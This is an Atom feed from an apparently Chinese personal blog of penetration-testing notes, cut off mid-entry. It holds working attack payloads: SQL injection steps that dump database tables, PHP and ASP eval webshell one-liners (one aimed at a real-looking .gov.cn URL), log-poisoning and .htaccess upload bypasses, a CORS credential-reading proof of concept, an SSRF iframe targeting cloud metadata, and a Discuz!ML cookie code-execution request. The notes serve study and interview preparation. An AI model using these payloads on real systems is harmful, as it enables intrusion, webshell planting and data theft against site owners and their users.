<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Saltneko</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-02-04T05:51:00.202Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Salt</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透测试面经</title>
    <link href="http://yoursite.com/2020/02/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E7%BB%8F/"/>
    <id>http://yoursite.com/2020/02/04/渗透测试面经/</id>
    <published>2020-02-04T05:34:00.000Z</published>
    <updated>2020-02-04T05:51:00.202Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/pasted-119.png" alt="upload successful"></p><a id="more"></a><p><img src="/images/pasted-114.png" alt="upload successful"><br><img src="/images/pasted-120.png" alt="upload successful"><br><img src="/images/pasted-115.png" alt="upload successful"><br><img src="/images/pasted-116.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/images/pasted-119.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="面经" scheme="http://yoursite.com/categories/%E9%9D%A2%E7%BB%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL面经</title>
    <link href="http://yoursite.com/2020/02/04/SQL%E9%9D%A2%E7%BB%8F/"/>
    <id>http://yoursite.com/2020/02/04/SQL面经/</id>
    <published>2020-02-04T05:33:00.000Z</published>
    <updated>2020-02-04T05:51:07.766Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/pasted-121.png" alt="upload successful"></p><a id="more"></a><p><img src="/images/pasted-110.png" alt="upload successful"><br><img src="/images/pasted-117.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/images/pasted-121.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="面经" scheme="http://yoursite.com/categories/%E9%9D%A2%E7%BB%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS面经</title>
    <link href="http://yoursite.com/2020/02/04/XSS%E9%9D%A2%E7%BB%8F/"/>
    <id>http://yoursite.com/2020/02/04/XSS面经/</id>
    <published>2020-02-04T05:33:00.000Z</published>
    <updated>2020-02-04T08:20:36.535Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/pasted-122.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/pasted-122.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="面经" scheme="http://yoursite.com/categories/%E9%9D%A2%E7%BB%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>网络安全原理与实践（1）</title>
    <link href="http://yoursite.com/2020/02/04/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%EF%BC%881%EF%BC%89/"/>
    <id>http://yoursite.com/2020/02/04/网络安全原理与实践（1）/</id>
    <published>2020-02-04T05:30:00.000Z</published>
    <updated>2020-02-04T05:51:13.402Z</updated>
    
    <content type="html"><![CDATA[<p>第一章 网络安全介绍的读书笔记<br><img src="/images/pasted-113.png" alt="upload successful"></p><a id="more"></a><p><img src="/images/pasted-102.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一章 网络安全介绍的读书笔记&lt;br&gt;&lt;img src=&quot;/images/pasted-113.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term=" 网络安全原理与实践" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="http://yoursite.com/2020/02/04/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/02/04/SQL注入/</id>
    <published>2020-02-04T05:21:00.000Z</published>
    <updated>2020-02-04T05:24:14.758Z</updated>
    
    <content type="html"><![CDATA[<h3 id="判断存在注入"><a href="#判断存在注入" class="headerlink" title="#判断存在注入"></a>#判断存在注入</h3><p>1.访问<code>id=1</code><br>2.访问<code>id=1</code>‘，返回内容与1不同<br>3.访问<code>id=1 and 1=1</code>，返回内容与1相同<br>4.访问<code>id=1 and 1=2</code>，返回内容与1不同<br>=》判断存在注入</p><a id="more"></a><h3 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="#寻找注入点"></a>#寻找注入点</h3><p>5.访问<code>id=1 order by 1(1-99)</code>,直到返回内容与1不同（例：字段数为3）<br>6.访问<code>id=1 union select 1,2,3</code>，返回内容与1相同（代码只返回第一条结果）<br>7.访问<code>id=-1 union select 1,2,3</code>，返回union select结果（例：返回2:3，即2，3间可插入mysql语句）<br>###<br>#库表字段（需记忆）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">库：information_schema</span><br><span class="line">表：SCHEMATA-&gt;SCHEMA_NAME（对应字段）</span><br><span class="line">TABLES-&gt;TABLE_SCHEMA,TABLE_NAME</span><br><span class="line">    COLUMNS-&gt;TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME</span><br><span class="line">SQL格式：union select 查询字段名 from 库.表 where 已知条件字段名&#x3D;‘已知条件的值’</span><br></pre></td></tr></table></figure><h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="#爆数据库名"></a>#爆数据库名</h3><p>8.访问<code>id=-1 union select 1,database(),3</code>（例：返回sql）</p><h3 id="爆数据表名"><a href="#爆数据表名" class="headerlink" title="#爆数据表名"></a>#爆数据表名</h3><p>9.访问<code>id=-1 union select 1,(select table_name from information_schema.table where table_schema=&#39;sql&#39; limit 0,1),3</code>（例：返回email，调试[limit1,1]返回referers)</p><h3 id="爆字段名"><a href="#爆字段名" class="headerlink" title="#爆字段名"></a>#爆字段名</h3><p>10.访问<code>id=-1 union select 1,(select column_name from information_schema.columns from where table_schema=&#39;sql&#39; and table_name=&#39;emails&#39; limit 0,1),3</code>（例：返回id)</p><h3 id="爆数据"><a href="#爆数据" class="headerlink" title="#爆数据"></a>#爆数据</h3><p>11.访问<code>id=-1 union select 1,(select id from sql.email limit 0,1),3</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;判断存在注入&quot;&gt;&lt;a href=&quot;#判断存在注入&quot; class=&quot;headerlink&quot; title=&quot;#判断存在注入&quot;&gt;&lt;/a&gt;#判断存在注入&lt;/h3&gt;&lt;p&gt;1.访问&lt;code&gt;id=1&lt;/code&gt;&lt;br&gt;2.访问&lt;code&gt;id=1&lt;/code&gt;‘，返回内容与1不同&lt;br&gt;3.访问&lt;code&gt;id=1 and 1=1&lt;/code&gt;，返回内容与1相同&lt;br&gt;4.访问&lt;code&gt;id=1 and 1=2&lt;/code&gt;，返回内容与1不同&lt;br&gt;=》判断存在注入&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>常用网站渗透思路</title>
    <link href="http://yoursite.com/2020/02/04/%E5%B8%B8%E7%94%A8%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/"/>
    <id>http://yoursite.com/2020/02/04/常用网站渗透思路/</id>
    <published>2020-02-04T05:12:00.000Z</published>
    <updated>2020-02-04T05:17:25.462Z</updated>
    
    <content type="html"><![CDATA[<h3 id="防撞库"><a href="#防撞库" class="headerlink" title="#防撞库"></a>#防撞库</h3><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="#SQL注入"></a>#SQL注入</h3><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="#万能密码"></a>#万能密码</h3><h3 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="#短信轰炸"></a>#短信轰炸</h3><h3 id="明文传输（抓包看post）"><a href="#明文传输（抓包看post）" class="headerlink" title="#明文传输（抓包看post）"></a>#明文传输（抓包看post）</h3><h3 id="盲打XSS"><a href="#盲打XSS" class="headerlink" title="#盲打XSS"></a>#盲打XSS</h3><h3 id="查找上传（申请友链，头像，敏感页面等）"><a href="#查找上传（申请友链，头像，敏感页面等）" class="headerlink" title="#查找上传（申请友链，头像，敏感页面等）"></a>#查找上传（申请友链，头像，敏感页面等）</h3><h3 id="查找编辑器"><a href="#查找编辑器" class="headerlink" title="#查找编辑器"></a>#查找编辑器</h3><h3 id="查找phpmyadmin等管理程序尝试弱口令登陆"><a href="#查找phpmyadmin等管理程序尝试弱口令登陆" class="headerlink" title="#查找phpmyadmin等管理程序尝试弱口令登陆"></a>#查找phpmyadmin等管理程序尝试弱口令登陆</h3><a id="more"></a><h3 id="移动端密码重置"><a href="#移动端密码重置" class="headerlink" title="#移动端密码重置"></a>#移动端密码重置</h3><p>1.输入手机号发送重置密码请求，收到4/6位验证码，尝试暴力破解（存在频率限制，但不会对请求执行黑名单化行为）<br>2.在竞态条件之下，使用多个IP地址向Instagram后端发送多个密码重置的确认码并发请求</p><h3 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="#越权漏洞"></a>#越权漏洞</h3><p>1.直接在用户名后尝试不同的用户ID越权登陆（登陆/创建联系人/添加用户等功能）<br>2.a)创建账号前抓包，传入未注册邮箱信息看Response（可能返回auth_token值）； b)根据post得知获取用户信息的路径； c)在 burpsuite的代理历史中查看有哪些请求用到了auth_token； d)浏览器隐身模式登陆对应URL（成功登陆劫持）；</p><h3 id="绕过密码确认限制"><a href="#绕过密码确认限制" class="headerlink" title="#绕过密码确认限制"></a>#绕过密码确认限制</h3><p>1.未设置验证的情况下，发送修改密码申请并抓包修改目标用户邮箱为自己的邮箱，成功修改用户密码并登陆<br>2.通过测试账号找到注册邮箱更改路径，抓包根据具体的post内容修改用户邮箱为自己的邮箱</p><h3 id="存在允许将信息导出为PDF的功能（大部分为HTML转PDF），在源信息中输入一些HTML代码之后，就能让目标应用在服务端执行相应的HTML代码"><a href="#存在允许将信息导出为PDF的功能（大部分为HTML转PDF），在源信息中输入一些HTML代码之后，就能让目标应用在服务端执行相应的HTML代码" class="headerlink" title="#存在允许将信息导出为PDF的功能（大部分为HTML转PDF），在源信息中输入一些HTML代码之后，就能让目标应用在服务端执行相应的HTML代码"></a>#存在允许将信息导出为PDF的功能（大部分为HTML转PDF），在源信息中输入一些HTML代码之后，就能让目标应用在服务端执行相应的HTML代码</h3><p>例：通过请求AWS元数据服务查看敏感信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;169.254.169.254&#x2F;latest&#x2F;meta-data&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="COSR（跨站资源共享策略配置不当）未设置访问源白名单并具备规则"><a href="#COSR（跨站资源共享策略配置不当）未设置访问源白名单并具备规则" class="headerlink" title="#COSR（跨站资源共享策略配置不当）未设置访问源白名单并具备规则"></a>#COSR（跨站资源共享策略配置不当）未设置访问源白名单并具备规则</h3><p><code>Access-Control-Allow-Credentials: true</code><br>概念验证代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">     &lt;body&gt;</span><br><span class="line"></span><br><span class="line">         &lt;h2&gt;CORS PoC&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br><span class="line">         &lt;div id&#x3D;&quot;demo&quot;&gt;</span><br><span class="line"></span><br><span class="line">             &lt;button type&#x3D;&quot;button&quot; onclick&#x3D;&quot;cors()&quot;&gt;Exploit&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">         &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">         &lt;script&gt;</span><br><span class="line"></span><br><span class="line">             function cors() &#123;</span><br><span class="line"></span><br><span class="line">             var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">             xhr.onreadystatechange &#x3D; function() &#123;</span><br><span class="line"></span><br><span class="line">                 if (this.readyState &#x3D;&#x3D; 4 &amp;&amp; this.status &#x3D;&#x3D; 200) &#123;</span><br><span class="line"></span><br><span class="line">                 document.getElementById(&quot;demo&quot;).innerHTML &#x3D; alert(this.responseText);</span><br><span class="line"></span><br><span class="line">                 &#125;</span><br><span class="line"></span><br><span class="line">             &#125;;</span><br><span class="line"></span><br><span class="line">              xhr.open(&quot;GET&quot;,</span><br><span class="line"></span><br><span class="line">                       &quot;https:&#x2F;&#x2F;api.company.com&#x2F;endpoint&quot;, true);</span><br><span class="line"></span><br><span class="line">             xhr.withCredentials &#x3D; true;</span><br><span class="line"></span><br><span class="line">             xhr.send();</span><br><span class="line"></span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">         &lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">     &lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line"> &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="PHP文件包含"><a href="#PHP文件包含" class="headerlink" title="#PHP文件包含"></a>#PHP文件包含</h3><h3 id="日志（具有读权限）"><a href="#日志（具有读权限）" class="headerlink" title="#日志（具有读权限）"></a>#日志（具有读权限）</h3><p>1.查找日志文件存放位置：<br>1）利用文件包含漏洞去读取apache日志默认在/etc/httpd/logs/access_log<br>2）找apache配置文件，通过任意文件读取漏洞配置文件找到日志路径/etc/httpd/conf/httpd.conf<br>1.插入PHP代码：<br>1）使用burpsuit抓包访问，绕过浏览器编码&lt;&gt;<br>2）curl访问不存在的url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.192.1&#x2F;a.php?&#x3D;&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><h3 id="会话文件"><a href="#会话文件" class="headerlink" title="#会话文件"></a>#会话文件</h3><h3 id="php-访问URL通过post提交PHP代码并执行"><a href="#php-访问URL通过post提交PHP代码并执行" class="headerlink" title="#php..// 访问URL通过post提交PHP代码并执行"></a>#<code>php..//</code> 访问URL通过post提交PHP代码并执行</h3><p>例：写入一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fwrite(fopen(&quot;xxx.php&quot;,&quot;w&quot;),&#39;&lt;?php eval($_POST[&quot;cc&quot;]);?&gt;&#39;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="htaccess文件突破黑名单（上传格式限制）"><a href="#htaccess文件突破黑名单（上传格式限制）" class="headerlink" title="#.htaccess文件突破黑名单（上传格式限制）"></a>#.htaccess文件突破黑名单（上传格式限制）</h3><p>1.自定义.htaccess上传</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FileMatch “test.jpg”&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FileMatch&gt;</span><br></pre></td></tr></table></figure><p>2.同目录下上传保存为jpg格式的一句话，成功绕过限制</p><h3 id="php流封装绕过截断"><a href="#php流封装绕过截断" class="headerlink" title="#php流封装绕过截断"></a>#php流封装绕过截断</h3><p>例：设文件包含代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a &#x3D; $_GET[&#39;file&#39;]; </span><br><span class="line">include $a.&#39;.html.php&#39;;</span><br></pre></td></tr></table></figure><p>％00无法截断，只能包含xxxx.html.php<br>1.新建一个hello.html.php，内容为<code>phpinfo（）;</code><br>2.压缩成zip<br>3.访问网址[<a href="http://localhost/test/blog.php?file=zip://test.zip%23hello],成功包含压缩文件内的`hello.html.php`" target="_blank" rel="noopener">http://localhost/test/blog.php?file=zip://test.zip%23hello],成功包含压缩文件内的`hello.html.php`</a></p><h3 id="通用防注入系统getshell"><a href="#通用防注入系统getshell" class="headerlink" title="#通用防注入系统getshell"></a>#通用防注入系统getshell</h3><p>1.网站的目录存在sqlin.asp保存注入记录 可以写入一句话木马<br>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;pzzl.gov.cn&#x2F;sqlin.asp?id&#x3D;1 and 1&#x3D;&lt;%eval request(&quot;salt&quot;)%&gt;</span><br></pre></td></tr></table></figure><p>2.若失败，则对一句话木马进行简单加密，用菜刀进行连接</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;防撞库&quot;&gt;&lt;a href=&quot;#防撞库&quot; class=&quot;headerlink&quot; title=&quot;#防撞库&quot;&gt;&lt;/a&gt;#防撞库&lt;/h3&gt;&lt;h3 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;#SQL注入&quot;&gt;&lt;/a&gt;#SQL注入&lt;/h3&gt;&lt;h3 id=&quot;万能密码&quot;&gt;&lt;a href=&quot;#万能密码&quot; class=&quot;headerlink&quot; title=&quot;#万能密码&quot;&gt;&lt;/a&gt;#万能密码&lt;/h3&gt;&lt;h3 id=&quot;短信轰炸&quot;&gt;&lt;a href=&quot;#短信轰炸&quot; class=&quot;headerlink&quot; title=&quot;#短信轰炸&quot;&gt;&lt;/a&gt;#短信轰炸&lt;/h3&gt;&lt;h3 id=&quot;明文传输（抓包看post）&quot;&gt;&lt;a href=&quot;#明文传输（抓包看post）&quot; class=&quot;headerlink&quot; title=&quot;#明文传输（抓包看post）&quot;&gt;&lt;/a&gt;#明文传输（抓包看post）&lt;/h3&gt;&lt;h3 id=&quot;盲打XSS&quot;&gt;&lt;a href=&quot;#盲打XSS&quot; class=&quot;headerlink&quot; title=&quot;#盲打XSS&quot;&gt;&lt;/a&gt;#盲打XSS&lt;/h3&gt;&lt;h3 id=&quot;查找上传（申请友链，头像，敏感页面等）&quot;&gt;&lt;a href=&quot;#查找上传（申请友链，头像，敏感页面等）&quot; class=&quot;headerlink&quot; title=&quot;#查找上传（申请友链，头像，敏感页面等）&quot;&gt;&lt;/a&gt;#查找上传（申请友链，头像，敏感页面等）&lt;/h3&gt;&lt;h3 id=&quot;查找编辑器&quot;&gt;&lt;a href=&quot;#查找编辑器&quot; class=&quot;headerlink&quot; title=&quot;#查找编辑器&quot;&gt;&lt;/a&gt;#查找编辑器&lt;/h3&gt;&lt;h3 id=&quot;查找phpmyadmin等管理程序尝试弱口令登陆&quot;&gt;&lt;a href=&quot;#查找phpmyadmin等管理程序尝试弱口令登陆&quot; class=&quot;headerlink&quot; title=&quot;#查找phpmyadmin等管理程序尝试弱口令登陆&quot;&gt;&lt;/a&gt;#查找phpmyadmin等管理程序尝试弱口令登陆&lt;/h3&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Discuz!ML 3.x任意代码执行漏洞</title>
    <link href="http://yoursite.com/2020/02/04/Discuz-ML-3-x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/02/04/Discuz-ML-3-x任意代码执行漏洞/</id>
    <published>2020-02-04T05:10:00.000Z</published>
    <updated>2020-02-04T05:33:34.682Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞综述"><a href="#漏洞综述" class="headerlink" title="#漏洞综述"></a>#漏洞综述</h3><p>漏洞类型：代码执行漏洞<br>影响系统及版本：Discuz!ML V3.2-3.4<br>漏洞原因：Discuz!ML 系统对cookie中的l接收的language参数内容未过滤，导致字符串拼接，从而执行php代码。</p><a id="more"></a><h3 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="#漏洞poc"></a>#漏洞poc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;Discuz&#x2F;upload&#x2F;forum.php HTTP &#x2F; 1.1 </span><br><span class="line">主机：169.254.183.180 </span><br><span class="line">User-Agent：Mozilla &#x2F; 5.0（Windows NT 10.0; Win64; x64; rv：68.0）Gecko &#x2F; 20100101 Firefox &#x2F; 68.0 </span><br><span class="line">接受：text &#x2F; html，application &#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8 </span><br><span class="line">Accept-Language：zh-CN，zh; q &#x3D; 0.8，zh-TW; q &#x3D; 0.7，zh-HK; q &#x3D; 0.5， en-US; q &#x3D; 0.3，en; q &#x3D; 0.2 </span><br><span class="line">Accept-Encoding：gzip，deflate </span><br><span class="line">Connection：close </span><br><span class="line">Cookie：lpAo_2132_saltkey &#x3D; gJ6FRwO6; lpAo_2132_language &#x3D; en&#39;.phpinfo（）&#39;。lpAo_2132_lastvisit &#x3D; 1563156484; lpAo_2132_sid &#x3D; G5YO6z; lpAo_2132_lastact &#x3D; 1563160086％09home.php％09misc; lpAo_2132_onlineusernum &#x3D; 1; lpAo_2132_sendmail &#x3D; 1 </span><br><span class="line">升级 - 不安全请求：1 </span><br><span class="line">缓存控制：max-age &#x3D; 0</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="#漏洞分析"></a>#漏洞分析</h3><p>1.在PoC的代码中填充’.1.’使得代码出错，定位出错代码文件：<br><img src="/images/pasted-104.png" alt="upload successful"><br><img src="/images/pasted-93.png" alt="upload successful"><br>2.报错点1:portal.php 第35行，<br><img src="/images/pasted-94.png" alt="upload successful"><br><img src="/images/pasted-96.png" alt="upload successful"><br>紧接着定位libfile函数，文件加载路径函数（command+B）。该函数读取source目录下的$folder子目录作为基础部分。<br><img src="/images/pasted-97.png" alt="upload successful"><br>该函数读取source目录下的$folder子目录作为基础部分，realpath函数为返回绝对路径函数，DISCUZ_ROOT为定义网站根目录的常量。<br>=&gt;原因是系统因为找不到一个php文件而报的错。<br>3.报错2:<code>source/moudle/portal_index.php</code> 第32行<br><img src="/images/pasted-98.png" alt="upload successful"><br><img src="/images/pasted-99.png" alt="upload successful"><br>定位template函数，文件加载路径函数<code>/source/function/function_core.php</code>（command+B）。该函数作用也是调用模版。<br><img src="/images/pasted-100.png" alt="upload successful"><br>程序将缓存文件写在了<code>/data/template/</code>目录下，文件名由DISCUZ_LANG等多个变量组成，追溯DISCUZ_LANG的输入为<code>$_config[&#39;output&#39;][&#39;language&#39;]</code><br><img src="/images/pasted-101.png" alt="upload successful"><br>继续跟进该值（command+shift+F)<br><img src="/images/pasted-107.png" alt="upload successful"><br>=&gt;DISCUZ_LANG值为Cookie中获取到的language（$lng），未设置过滤<br><img src="/images/pasted-106.png" alt="upload successful"><br>4.总结</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.从cookie中获取了language的值(可控）</span><br><span class="line">2.language值赋给$lng</span><br><span class="line">3.$lng值赋给DISCUZ_LANG</span><br><span class="line">4.系统通过template函数调用模板文件</span><br><span class="line">5.template函数执行，执行到$cachefile的时候，执行构造的代码</span><br></pre></td></tr></table></figure><h3 id="复现"><a href="#复现" class="headerlink" title="#复现"></a>#复现</h3><p>抓包并在在language参数处’.phpinfo().’</p><h3 id="参考"><a href="#参考" class="headerlink" title="#参考"></a>#参考</h3><p>Discuz!ML 3.x任意代码执行漏洞之大佬分析之后我分析<br><a href="https://www.freebuf.com/vuls/208457.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208457.html</a><br>Discuz！ML V3.X代码注入复现与原理分析<br><a href="https://museljh.github.io/2019/07/15/Discuz!ML%20V3.X%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://museljh.github.io/2019/07/15/Discuz!ML%20V3.X%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</a><br>Discuz!ML V3.X 代码注入分析<br><a href="https://mp.weixin.qq.com/s/5Zl3Jve4eblNIXh30t469w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/5Zl3Jve4eblNIXh30t469w</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;漏洞综述&quot;&gt;&lt;a href=&quot;#漏洞综述&quot; class=&quot;headerlink&quot; title=&quot;#漏洞综述&quot;&gt;&lt;/a&gt;#漏洞综述&lt;/h3&gt;&lt;p&gt;漏洞类型：代码执行漏洞&lt;br&gt;影响系统及版本：Discuz!ML V3.2-3.4&lt;br&gt;漏洞原因：Discuz!ML 系统对cookie中的l接收的language参数内容未过滤，导致字符串拼接，从而执行php代码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>上传限制绕过</title>
    <link href="http://yoursite.com/2020/02/04/%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/"/>
    <id>http://yoursite.com/2020/02/04/上传限制绕过/</id>
    <published>2020-02-04T05:08:00.000Z</published>
    <updated>2020-02-04T05:09:51.519Z</updated>
    
    <content type="html"><![CDATA[<h3 id="htaccess文件突破黑名单（上传格式限制）"><a href="#htaccess文件突破黑名单（上传格式限制）" class="headerlink" title="#.htaccess文件突破黑名单（上传格式限制）"></a>#.htaccess文件突破黑名单（上传格式限制）</h3><p>1.自定义.htaccess上传</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FileMatch “test.jpg”&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FileMatch&gt;</span><br></pre></td></tr></table></figure><p>2.同目录下上传保存为jpg格式的一句话，成功绕过限制</p><a id="more"></a><h3 id="php流封装绕过截断"><a href="#php流封装绕过截断" class="headerlink" title="#php流封装绕过截断"></a>#php流封装绕过截断</h3><p>例：设文件包含代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a &#x3D; $_GET[&#39;file&#39;]; </span><br><span class="line">include $a.&#39;.html.php&#39;;</span><br></pre></td></tr></table></figure><p>％00无法截断，只能包含xxxx.html.php<br>1.新建一个hello.html.php，内容为phpinfo（）;<br>2.压缩成zip<br>3.访问网址[<a href="http://localhost/test/blog.php?file=zip://test.zip%23hello],成功包含压缩文件内的hello.html.php" target="_blank" rel="noopener">http://localhost/test/blog.php?file=zip://test.zip%23hello],成功包含压缩文件内的hello.html.php</a></p><h3 id="0x00截断"><a href="#0x00截断" class="headerlink" title="#0x00截断"></a>#0x00截断</h3><p>0x00截断，00截断是将上传文件名或路径名中使用ascll码值为0的字符（也就是null）来进行截断<br>1.BP抓包<br>2.在/Upload/后面加一个空格，点开hex，将其对应的20改成00即可，就可以绕过后缀名的过滤，从而得到webshell</p><h3 id="00截断"><a href="#00截断" class="headerlink" title="#%00截断"></a>#%00截断</h3><p>%00一般用在URL中用于截断url来进行文件包含<br>1.BP抓包<br>2.在filename后面加%00.jpg，先绕过后缀上传，然后利用burp的urldecode功能，其实和/00截断将hex20变成00一样，效果一样，两种方法都可以拿webshell</p><h3 id="竞争上传"><a href="#竞争上传" class="headerlink" 